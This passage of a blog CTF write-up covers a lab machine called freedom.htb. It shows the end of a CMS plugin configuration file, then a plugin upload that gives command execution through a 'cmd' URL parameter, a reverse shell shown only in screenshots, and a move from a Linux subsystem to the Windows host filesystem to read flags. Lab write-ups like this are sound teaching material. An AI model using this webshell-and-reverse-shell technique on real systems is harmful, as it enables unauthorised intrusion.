+<span class="line"><span style="color:#E6EDF3">&#x3C;</span><span style="color:#FFA198;font-style:italic">provider</span><span style="color:#E6EDF3">>Blue River Interactive Group&#x3C;/</span><span style="color:#FFA198;font-style:italic">provider</span><span style="color:#E6EDF3">></span></span>
+<span class="line"><span style="color:#E6EDF3">&#x3C;</span><span style="color:#FFA198;font-style:italic">providerURL</span><span style="color:#E6EDF3">>http://www.blueriver.com&#x3C;/</span><span style="color:#FFA198;font-style:italic">providerURL</span><span style="color:#E6EDF3">></span></span>
+<span class="line"><span style="color:#E6EDF3">&#x3C;</span><span style="color:#FFA198;font-style:italic">category</span><span style="color:#E6EDF3">>Utility&#x3C;/</span><span style="color:#FFA198;font-style:italic">category</span><span style="color:#E6EDF3">></span></span>
+<span class="line"><span style="color:#E6EDF3">&#x3C;</span><span style="color:#FFA198;font-style:italic">directoryFormat</span><span style="color:#E6EDF3">>packageOnly&#x3C;/</span><span style="color:#FFA198;font-style:italic">directoryFormat</span><span style="color:#E6EDF3">></span></span>
+<span class="line"><span style="color:#E6EDF3">&#x3C;</span><span style="color:#FFA198;font-style:italic">ormCFCLocation</span><span style="color:#E6EDF3">>/orm&#x3C;/</span><span style="color:#FFA198;font-style:italic">ormCFCLocation</span><span style="color:#E6EDF3">></span></span>
+<span class="line"><span style="color:#E6EDF3">&#x3C;</span><span style="color:#FFA198;font-style:italic">customTagPaths</span><span style="color:#E6EDF3">>customtags&#x3C;/</span><span style="color:#FFA198;font-style:italic">customTagPaths</span><span style="color:#E6EDF3">></span></span>
+<span class="line"><span style="color:#E6EDF3">&#x3C;</span><span style="color:#FFA198;font-style:italic">autoDeploy</span><span style="color:#E6EDF3">>true&#x3C;/</span><span style="color:#FFA198;font-style:italic">autoDeploy</span><span style="color:#E6EDF3">></span></span>
+<span class="line"><span style="color:#E6EDF3">&#x3C;</span><span style="color:#FFA198;font-style:italic">siteID</span><span style="color:#E6EDF3">>siteA,siteB&#x3C;/</span><span style="color:#FFA198;font-style:italic">siteID</span><span style="color:#E6EDF3">></span></span>
+<span class="line"><span style="color:#E6EDF3">&#x3C;</span><span style="color:#FFA198;font-style:italic">mappings</span><span style="color:#E6EDF3">>...&#x3C;/</span><span style="color:#FFA198;font-style:italic">mappings</span><span style="color:#E6EDF3">></span></span>
+<span class="line"><span style="color:#E6EDF3">&#x3C;</span><span style="color:#FFA198;font-style:italic">settings</span><span style="color:#E6EDF3">>...&#x3C;/</span><span style="color:#FFA198;font-style:italic">settings</span><span style="color:#E6EDF3">></span></span>
+<span class="line"><span style="color:#E6EDF3">&#x3C;</span><span style="color:#FFA198;font-style:italic">eventHandlers</span><span style="color:#E6EDF3">>...&#x3C;/</span><span style="color:#FFA198;font-style:italic">eventHandlers</span><span style="color:#E6EDF3">></span></span>
+<span class="line"><span style="color:#E6EDF3">&#x3C;</span><span style="color:#FFA198;font-style:italic">displayobjects</span><span style="color:#E6EDF3">>...&#x3C;/</span><span style="color:#FFA198;font-style:italic">displayobjects</span><span style="color:#E6EDF3">></span></span>
+<span class="line"><span style="color:#E6EDF3">&#x3C;</span><span style="color:#FFA198;font-style:italic">extensions</span><span style="color:#E6EDF3">>...&#x3C;/</span><span style="color:#FFA198;font-style:italic">extensions</span><span style="color:#E6EDF3">></span></span>
+<span class="line"><span style="color:#E6EDF3">&#x3C;/</span><span style="color:#FFA198;font-style:italic">plugin</span><span style="color:#E6EDF3">></span></span></code></pre>
+<p>After zipping the files together and adding a new plugin, we can access it on <code>http://freedom.htb/plugins/MyFirstPlugin/index.cfm?cmd=&#x3C;your command></code> .</p>
+<p><img src="/images/freedom/freedom_7.png" alt=""></p>
+<p>From here, we can make our access easier by using a reverse shell.</p>
+<p><img src="/images/freedom/freedom_8.png" alt=""></p>
+<h3 id="sandbox-escape">Sandbox Escape</h3>
+<p>We got stuck here for a while since I cannot find the root flag or user flag anywhere, until my teammate NeoZap found something inside the <code>/etc/resolv.conf</code>file.</p>
+<p><img src="/images/freedom/freedom_9.png" alt=""></p>
+<p>This means this Linux instance is actually hosted on a Windows machine. So it could mean that the flags are actually in the Windows part of the host machine. To access the host Windows filesystem, we can access it from the <code>/mnt/c</code> directory. And from there we can get the user flag on the <code>j.bret</code>’s Desktop directory.</p>
+<p><img src="/images/freedom/freedom_10.png" alt=""></p>
+<p>The root flag is going to be on the <code>Administrator</code>’s (duh) Desktop directory.</p>
+<p><img src="/images/freedom/freedom_11.png" alt=""></p></div></article><aside class="toc" aria-label="On this page"><p>On this page</p><ol><li class="nested"><a href="#challenge-description">Challenge Description</a></li><li class="nested"><a href="#flags">Flags</a></li><li class="nested"><a href="#enumeration">Enumeration</a></li><li class="nested"><a href="#initial-access">Initial Access</a></li><li class="nested"><a href="#sandbox-escape">Sandbox Escape</a></li></ol></aside></main><footer class="site-footer"><div><span>k3ng.xyz</span><span class="footer-note">2026</span></div></footer><script>
+      document.querySelector('.theme-toggle')?.addEventListener('click', () => {
+        const theme = document.documentElement.dataset.theme === 'dark' ? 'light' : 'dark';
+        const updateTheme = () => {
+          document.documentElement.dataset.theme = theme;
+          localStorage.setItem('theme', theme);
+        };
+
+        if (document.startViewTransition) {
+          document.startViewTransition(updateTheme);
+          return;
+        }
+
+        document.documentElement.classList.add('theme-transition');
+        updateTheme();
+        setTimeout(() => document.documentElement.classList.remove('theme-transition'), 650);
+      });
+    </script></body></html>
